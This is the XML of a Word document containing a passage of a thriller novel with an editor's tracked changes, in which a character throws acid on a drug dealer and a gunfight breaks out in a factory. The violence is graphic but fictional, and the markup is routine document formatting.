        <w:r w:rsidR="005215B2">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and I’ll go pop it in the tank.” Her head swooped down. Another white rail disappeared.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eyes began darting back and forth, looking at the objects on the tabletop. She fidgeted with her hands, and occasionally glanced over her shoulder towards Rex.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“Are you okay?”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fine,” she said quickly.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look agitated,” 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just thinking…” she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outside, past the large double doors on the opposite side of the factory, came the sound of an engine, followed by car doors opening and closing.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dreadlocked guard said something beyond the wall. His words weren’t clear, but he sounded surprised.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Someone answered in a Russian accent. “…Tonight is complete cluster of fucks!…”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recognized the voice. He</w:t>
      </w:r>
      <w:ins w:id="2131" w:author="TextVet" w:date="2016-03-22T11:01:00Z">
        <w:r w:rsidR="00D320EE">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>’</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2132" w:author="TextVet" w:date="2016-03-22T11:01:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00D320EE">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> ha</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>d heard it on the stolen cellphone</w:t>
      </w:r>
      <w:ins w:id="2133" w:author="TextVet" w:date="2016-03-22T11:02:00Z">
        <w:r w:rsidR="00D320EE">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>—</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2134" w:author="TextVet" w:date="2016-03-22T11:01:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00D320EE">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">. </w:delText>
        </w:r>
      </w:del>
      <w:del w:id="2135" w:author="TextVet" w:date="2016-03-22T11:02:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00D320EE">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">It was </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>the voice of Sergey Mukhayev.</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Rex froze</w:t>
      </w:r>
      <w:del w:id="2136" w:author="TextVet" w:date="2016-03-22T11:02:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00C87988">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> in place</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. “Oh… shit…”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third person outside spoke. Danny recognized the voice of the man from the Tungsten hallway: Eugene Mukhayev. “That’s the car! That’s their fucking car!”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Jason gulped, and backed toward the rear wall, behind the steel drums.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Rex sprang to life. “We’ve got to get rid of the coke! I wasn’t supposed to give you any! I’m not even supposed to </w:t>
      </w:r>
      <w:r w:rsidR="00566952" w:rsidRPr="00566952">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:rPrChange w:id="2137" w:author="TextVet" w:date="2016-03-22T11:03:00Z">
            <w:rPr>
              <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
              <w:color w:val="000000"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:t>have</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> any. </w:t>
      </w:r>
      <w:r w:rsidR="00566952" w:rsidRPr="00566952">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:rPrChange w:id="2138" w:author="TextVet" w:date="2016-03-22T11:03:00Z">
            <w:rPr>
              <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
              <w:color w:val="000000"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:t>Fuck</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Julie, still fidgeting, </w:t>
      </w:r>
      <w:ins w:id="2139" w:author="TextVet" w:date="2016-03-22T11:03:00Z">
        <w:r w:rsidR="00E77582">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>scrabbled</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2140" w:author="TextVet" w:date="2016-03-22T11:03:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00E77582">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>grabbed clumsily</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> at the open packet of white powder. While handing it to Rex, she carefully enunciated, “Whoops!”, and let its contents spill onto the floor in a conspicuous pile.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fuck me!” Rex bent down next to Julie and tried to sweep the powder out of sight.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I was thinking about,” said Julie, speaking rapidly, “was that dopamine is active in more than just the nucleus accumbens. You know where else it’s found?”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his voice dry with fear, said, “Julie, I don’t think we have time for…”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substantia nigra,” said the girl. “It’s a part of your brain that controls movement. It’s the part that deteriorates in people with Parkinson’s disease. The pleasure centers might shape your desires, but the substantia nigra affects what you actually </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>do</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> about those desires.”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Outside, the voices argued. “Nothing? What do you mean, nothing?</w:t>
      </w:r>
      <w:ins w:id="2141" w:author="TextVet" w:date="2016-03-22T11:08:00Z">
        <w:r w:rsidR="007E2A4A">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shouted Sergey. The guard replied, “They scrubbed the car, boss. They even pulled off their VIN tags.”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“Now, what’s interesting about the substantia nigra,” Julie continued, “is that it functions by lateral inhibition. It takes all the possible different things you can do at any given moment, and chooses one based on learned reward expectation. See, your cerebral cortex comes up with dozens of different courses of action, all the time, every second you’re awake. Blink now or blink later? Left foot forward or right foot forward? Say ‘hello’ or say ‘goodbye’?…”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Rex, his face pale, kept sweeping desperately at the floor. “Fuck fuckfuck! He’s gonna know…”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watched the Asian girl’s hands as she talked. He noticed a pattern to her movements. She wasn’t fidgeting. She was rehearsing.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“…But of all those actions you’re thinking of taking all the time,” Julie resumed, “only one ever wins out. And it’s the substantia nigra that makes the selection. Of all the </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>hypothetical bodily movements you can possibly take, the substantia nigra chooses which one will get to activate the muscles. And the substantia nigra runs on dopamine.”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Jason barked. “Either help or shut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the alley, Sergey commanded, “You stay here! Guard door like you were supposed to! Eugene and I go take care of this ourselves.”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Footsteps ascended the stairs outside.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his head spinning from fear, gasped, “Julie, what’s your point?”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Suddenly she stopped moving and locked eyes with Danny. “My point,” she said slowly, “is that dopamine is the substance that converts thought into action.”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turned to look down at Rex on the floor hiding the mess of cocaine. She gave him an innocent smile. “And do you know what I’m thinking right now?” she asked him sweetly.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the pock-skinned man growled, looking up from his crouched position next to her chair.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she reached across the table, grabbed the clear unlabeled bottle, pulled out the stopper, and poured half a liter of hydrochloric acid onto his face.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00F62BCE">
      <w:pPr>
        <w:pStyle w:val="ChapterNum"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:lastRenderedPageBreak/>
        <w:t>18</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Nothing in the world had any right</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> to look like what Danny saw before him. It belonged on a movie screen, tempered by the knowledge that it was nothing more than CGI and latex. It could not — must not — be real.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tore at his face, frantically trying to wipe away the hissing, steaming froth that was forming on his flesh. His gun clattered to the concrete floor as he rose. He ran blindly a few stumbling steps before collapsing to his knees. His screams crescendoed so loud and high-pitched that they scarcely seemed human. Strands of blond hair fell from his head, curling and writhing on their own upon the floor. Within his eye sockets were two deformed cauldrons of bubbling white foam. Greenish-yellow cauliflower-like globules of fat spilled out from areas that had once been cheeks and chin.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stench was like vomit after a meal of putrescent meat.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then there was an explosion of mechanical sound — a </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>rat-tat-tat-tat-tat</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>, like someone shoving a metal rod into the spokes of a spinning bicycle wheel. Several smoky black blurs streaked through the air, toward the shrieking faceless thing that had been Rex. He collapsed lifeless on the factory floor. The cardboard and packing peanuts on the floor around the body turned crimson. The screams mercifully ended.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exhaled a satisfied, “Ahhhhh!” She stood where Rex’s gun had fallen, holding the blocky weapon awkwardly in both of her small hands. Smoke wafted from its barrel.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At the top of the stairs stood Eugene Mukhayev, and an immense middle-aged man that must have been Sergey. They stared with jaws slack, their eyes wide with horror and disgust.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swung the gun upward, pointed it at them, and opened fire without warning or hesitation.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two men ducked and took cover in the office directly behind them. Eugene returned fire from a small revolver, making sporadic half-blind shots from around the door jamb.</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Julie </w:t>
      </w:r>
      <w:commentRangeStart w:id="2142"/>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>shot in wild bursts</w:t>
      </w:r>
      <w:commentRangeEnd w:id="2142"/>
      <w:r w:rsidR="00A13A4F">
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:commentReference w:id="2142"/>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>, struggling against the recoil. Flakes of brick knocked loose from the walls around the stairs. The windows shattered</w:t>
      </w:r>
      <w:del w:id="2143" w:author="TextVet" w:date="2016-03-22T12:23:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00A13A4F">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> under fire</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, raining </w:t>
      </w:r>
      <w:ins w:id="2144" w:author="TextVet" w:date="2016-03-22T12:23:00Z">
        <w:r w:rsidR="00A13A4F">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">glass </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>shards</w:t>
      </w:r>
      <w:del w:id="2145" w:author="TextVet" w:date="2016-03-22T12:24:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00A13A4F">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> of glass</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r w:rsidR="00A13A4F">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Some</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> bullets </w:t>
      </w:r>
      <w:r w:rsidR="00A13A4F" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>splinter</w:t>
      </w:r>
      <w:r w:rsidR="00A13A4F">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ed</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> the pale blue door</w:t>
      </w:r>
      <w:r w:rsidR="00A13A4F">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>’s</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:ins w:id="2146" w:author="TextVet" w:date="2016-03-22T12:27:00Z">
        <w:r w:rsidR="00A13A4F" w:rsidRPr="000D3488">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>plywood</w:t>
        </w:r>
        <w:r w:rsidR="00A13A4F">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> into </w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="2147" w:author="TextVet" w:date="2016-03-22T12:26:00Z">
        <w:r w:rsidR="00A13A4F">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>sand-colored streaks</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2148" w:author="TextVet" w:date="2016-03-22T12:27:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00A13A4F">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>the plywood</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">. Spent shell casings </w:t>
      </w:r>
      <w:ins w:id="2149" w:author="TextVet" w:date="2016-03-22T12:28:00Z">
        <w:r w:rsidR="006335B2">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>leapt</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2150" w:author="TextVet" w:date="2016-03-22T12:28:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="006335B2">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>flew wildly</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> from her gun, pinging upon the concrete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One brass cylinder </w:t>
      </w:r>
      <w:ins w:id="2151" w:author="TextVet" w:date="2016-03-22T12:29:00Z">
        <w:r w:rsidR="006335B2">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>dinged</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2152" w:author="TextVet" w:date="2016-03-22T12:29:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="006335B2">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>hit</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> the back of Danny’s hand, still scorching hot. At that moment</w:t>
      </w:r>
      <w:ins w:id="2153" w:author="TextVet" w:date="2016-03-22T12:29:00Z">
        <w:r w:rsidR="0083211D">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it dawned on Danny that he wasn’t </w:t>
      </w:r>
      <w:del w:id="2154" w:author="TextVet" w:date="2016-03-22T12:29:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="0083211D">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">merely </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>a passive observer. The bullets from the office above were meant for him just as much as for the coke-addled girl.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looked for somewhere to hide. Jason had already bunkered himself under the metal table.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="003750D2" w:rsidP="000D3488">
      <w:pPr>
        <w:spacing w:after="0" w:line="420" w:lineRule="atLeast"/>
        <w:ind w:firstLine="600"/>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2155" w:author="TextVet" w:date="2016-03-22T12:31:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>Clenching</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2156" w:author="TextVet" w:date="2016-03-22T12:31:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="003750D2">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>With</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> his HERF gun</w:t>
      </w:r>
      <w:del w:id="2157" w:author="TextVet" w:date="2016-03-22T12:31:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="003750D2">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> in hand</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>, Danny dove to shield himself from the firefight. He ducked behind the largest, most solid</w:t>
      </w:r>
      <w:ins w:id="2158" w:author="TextVet" w:date="2016-03-22T12:32:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>-looking</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> object nearby.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Unfortunately</w:t>
      </w:r>
      <w:ins w:id="2159" w:author="TextVet" w:date="2016-03-22T12:32:00Z">
        <w:r w:rsidR="003750D2">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that object was a blue 55-gallon drum filled with kerosene.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 errant bullet from Eugene’s pistol plunked into the barrel, puncturing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had seen enough action movies and played enough first-person shooter games to know what happens when a barrel of flammable liquid gets shot. </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="444488"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>So this is it</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>, he thought quickly, more in impressions than words. </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
